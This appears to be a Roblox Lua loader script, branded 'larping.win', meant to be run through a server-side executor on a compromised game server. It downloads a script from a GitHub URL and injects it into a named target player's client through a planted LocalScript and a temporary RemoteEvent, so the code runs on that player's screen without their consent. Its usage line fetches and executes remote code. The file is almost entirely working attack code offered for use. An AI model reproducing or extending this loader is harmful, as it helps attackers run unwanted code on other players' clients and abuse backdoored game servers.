--[[
    larping.win | serverside — LOADER
    
    This loader runs SERVER-SIDE (in your SS executor).
    It fetches the main script from GitHub via HttpService,
    then fires it to the TARGET PLAYER's client through a
    temporary RemoteEvent so it executes with full client authority
    on their screen — not yours.

    Usage (run this in your serverside executor):
        loadstring(game:HttpGet("https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/larping_win_loader.lua"))()("TargetUsername")

    Or set TARGET_USER below and just loadstring the loader with no args:
        loadstring(game:HttpGet("...loader url..."))()

    Host larping_win_serverside.lua on GitHub and paste the raw URL in SCRIPT_URL.
--]]

-- ====================== CONFIG ======================
local SCRIPT_URL = "https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/larping_win_serverside.lua"

-- Timeout (seconds) waiting for the client to acknowledge receipt
local REMOTE_TIMEOUT = 10
-- ====================================================

local httpService  = game:GetService("HttpService")
local players      = game:GetService("Players")
local runService   = game:GetService("RunService")
local replicatedStorage = game:GetService("ReplicatedStorage")

-- ====================== RETURN A CALLABLE ======================
-- Calling the loader like loadstring(...)()("Username") invokes this function.
return function(targetUsername)

    -- ── 1. Validate we are on the server ──────────────────────────────────
    if runService:IsClient() then
        error("[larping.win loader] This loader must be run SERVER-SIDE (in your SS executor), not as a LocalScript.")
    end

    -- ── 2. Resolve the target player ──────────────────────────────────────
    local targetPlayer
    if targetUsername and targetUsername ~= "" then
        targetPlayer = players:FindFirstChild(targetUsername)
        if not targetPlayer then
            -- Show a workspace hint visible to everyone so the SS executor user
            -- knows it failed, then bail out.
            local hint = Instance.new("Hint", workspace)
            hint.Text = "[larping.win] Player '" .. tostring(targetUsername) .. "' not found in server."
            game:GetService("Debris"):AddItem(hint, 6)
            warn("[larping.win loader] Player '" .. tostring(targetUsername) .. "' not found.")
            return
        end
    else
        -- No username given — target all players (or prompt the SS executor user)
        warn("[larping.win loader] No username provided. Please call as: loader(\"PlayerName\")")
        local hint = Instance.new("Hint", workspace)
        hint.Text = "[larping.win] Usage: loader(\"PlayerName\")"
        game:GetService("Debris"):AddItem(hint, 6)
        return
    end

    -- ── 3. Fetch the main script from GitHub via HttpService ──────────────
    print("[larping.win loader] Fetching script from GitHub...")
    local fetchOk, scriptSource = pcall(function()
        return game:HttpGetAsync(SCRIPT_URL)
    end)

    if not fetchOk or not scriptSource or #scriptSource < 100 then
        local errMsg = fetchOk and "Empty/invalid response — check your SCRIPT_URL." or tostring(scriptSource)
        warn("[larping.win loader] Failed to fetch script: " .. errMsg)
        local hint = Instance.new("Hint", workspace)
        hint.Text = "[larping.win] GitHub fetch failed: " .. errMsg
        game:GetService("Debris"):AddItem(hint, 8)
        return
    end

    print("[larping.win loader] Script fetched (" .. #scriptSource .. " bytes). Preparing RemoteEvent...")

    -- ── 4. Create a temporary RemoteEvent in ReplicatedStorage ───────────
    -- The client will listen for this, loadstring the payload, and fire back
    -- to confirm receipt so we can clean up.
    local remoteId  = "LW_" .. tostring(math.random(100000, 999999))
    local remote    = Instance.new("RemoteEvent")
    remote.Name     = remoteId
    remote.Parent   = replicatedStorage

    -- Build the client-side bootstrap: receives the source, loadstrings it,
    -- calls it with the target username, then fires back to confirm.
    --
    -- We embed the remoteId and targetUsername as literal strings so the
    -- client-side chunk is entirely self-contained.
    local clientBootstrap = string.format([[
        local remoteId = %q
        local targetUsername = %q

        -- Wait for our private remote
        local remote = game:GetService("ReplicatedStorage"):WaitForChild(remoteId, 15)
        if not remote then return end

        -- Listen for the script payload from the server
        remote.OnClientEvent:Connect(function(source)
            -- loadstring the module source
            local fn, err = loadstring(source, "larping_win_serverside")
            if not fn then
                warn("[larping.win client] Parse error: " .. tostring(err))
                remote:FireServer("ERROR:" .. tostring(err))
                return
            end

            -- Execute the module to get the init function
            local ok, module = pcall(fn)
            if not ok then
                warn("[larping.win client] Load error: " .. tostring(module))
                remote:FireServer("ERROR:" .. tostring(module))
                return
            end

            -- Call init with the target username
            if type(module) == "function" then
                local initOk, result = pcall(module, targetUsername)
                if not initOk then
                    warn("[larping.win client] Init error: " .. tostring(result))
                    remote:FireServer("ERROR:" .. tostring(result))
                    return
                end
            end

            -- Signal success back to the server so it can clean up
            remote:FireServer("OK")
        end)
    ]], remoteId, targetUsername)

    -- ── 5. Deliver the bootstrap to the target client via a temporary LocalScript ──
    -- We use a LocalScript in the target player's PlayerGui so it runs in their context.
    local tempScript = Instance.new("LocalScript")
    tempScript.Name  = "LW_Bootstrap"
    tempScript.Source = clientBootstrap

    -- Listen for the client's acknowledgement BEFORE parenting,
    -- so we don't miss the event.
    local acknowledged = false
    local ackMessage   = ""

    local ackConn = remote.OnServerEvent:Connect(function(sender, message)
        if sender == targetPlayer then
            acknowledged = true
            ackMessage   = tostring(message)
        end
    end)

    -- Parent the bootstrap script to the target player — this makes it run on their client
    tempScript.Parent = targetPlayer:WaitForChild("PlayerGui", 5)

    -- Small delay to let the bootstrap wire up its listener
    task.wait(0.35)

    -- ── 6. Fire the script source to the target client ────────────────────
    print("[larping.win loader] Firing script payload to " .. targetPlayer.DisplayName .. "...")
    remote:FireClient(targetPlayer, scriptSource)

    -- ── 7. Wait for acknowledgement or timeout ────────────────────────────
    local elapsed = 0
    while not acknowledged and elapsed < REMOTE_TIMEOUT do
        task.wait(0.25)
        elapsed += 0.25
    end

    -- ── 8. Cleanup ────────────────────────────────────────────────────────
    ackConn:Disconnect()
    if tempScript and tempScript.Parent then tempScript:Destroy() end
    task.delay(1, function()
        if remote and remote.Parent then remote:Destroy() end
    end)

    -- ── 9. Report result ──────────────────────────────────────────────────
    if acknowledged then
        if ackMessage:sub(1, 5) == "ERROR" then
            warn("[larping.win loader] Client reported an error: " .. ackMessage)
            local hint = Instance.new("Hint", workspace)
            hint.Text = "[larping.win] Client error on " .. targetPlayer.DisplayName .. ": " .. ackMessage
            game:GetService("Debris"):AddItem(hint, 8)
        else
            print("[larping.win loader] ✓ larping.win successfully loaded on " .. targetPlayer.DisplayName .. "!")
            local hint = Instance.new("Hint", workspace)
            hint.Text = "[larping.win] Loaded on " .. targetPlayer.DisplayName .. " successfully!"
            game:GetService("Debris"):AddItem(hint, 5)
        end
    else
        warn("[larping.win loader] Timed out waiting for acknowledgement from " .. targetPlayer.DisplayName .. ".")
        local hint = Instance.new("Hint", workspace)
        hint.Text = "[larping.win] Timed out loading on " .. targetPlayer.DisplayName .. ". Are they still in the server?"
        game:GetService("Debris"):AddItem(hint, 8)
    end

end
